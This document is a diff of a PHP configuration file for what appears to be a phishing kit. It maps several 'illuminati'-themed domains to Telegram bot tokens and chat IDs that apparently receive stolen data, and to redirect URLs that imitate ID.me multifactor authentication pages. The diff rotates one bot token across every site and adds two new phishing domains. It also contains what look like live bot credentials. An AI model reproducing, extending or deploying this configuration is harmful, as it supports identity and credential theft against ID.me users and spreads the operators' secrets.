@@ -6,7 +6,7 @@
 $site_map = [
     '127.0.0.1' => [
         'bots' => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
         ],
         'redirect' => 'https://illuminatiofficial.world/index.html'
@@ -15,7 +15,7 @@ $site_map = [
 
     'paysphere.42web.io' => [
         'bots' => [
-             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
 
           //  ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
         ],
@@ -27,7 +27,7 @@ $site_map = [
     
     'illuminatiofficial.world' => [
         'bots' => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
         ],
         'redirect' => 'https://illuminatiofficial.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
@@ -35,7 +35,7 @@ $site_map = [
     
     'illuminatipath.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '7942412343:AAEVirV9J2LHm0-pqfmtkMYEUrEqABqVXE4', 'chat_id' => '6772487570'],
         ],
         "redirect" => "https://illuminatipath.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
@@ -43,7 +43,7 @@ $site_map = [
 
     'illuminatisyndicate.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
         ],
         "redirect" => "https://illuminatisyndicate.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
@@ -52,11 +52,34 @@ $site_map = [
 
     'illuminatilight.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8064658016:AAHEcSX8Y981ebjcAveqjyhS8sGkrGnYiq4', 'chat_id' => '7575811693'],
         ],
         "redirect" => "https://illuminatilight.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
     ],
+
+
+
+
+
+    'illuminatielite.world' => [
+        "bots" => [
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
+            ['token' => '8366280325:AAHfGhwKBV9xzW4iOjOsE3S1fHEU0kOewYQ', 'chat_id' => '8237687443'],
+        ],
+        "redirect" => "https://illuminatielite.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
+    ],
+
+
+    'illuminatipathway.world' => [
+        "bots" => [
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
+            ['token' => '7810816894:AAE7eOvKsbTjvCr3zdpgsIf-vXqddsYY0Rk', 'chat_id' => '7678714988'],
+        ],
+        "redirect" => "https://illuminatipathway.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
+    ],
+
+
 
 
     
@@ -64,7 +87,7 @@ $site_map = [
 
     'illuminatipathtolight.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '7952525150:AAHXfhactryTuwOnidJzq6UnDGxVEFkDk8k', 'chat_id' => '7982337001'],
         ],
         "redirect" => "https://illuminatipathtolight.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
@@ -75,7 +98,7 @@ $site_map = [
 
     'illuminatisacred.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
         ],
         "redirect" => "https://illuminatisacred.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
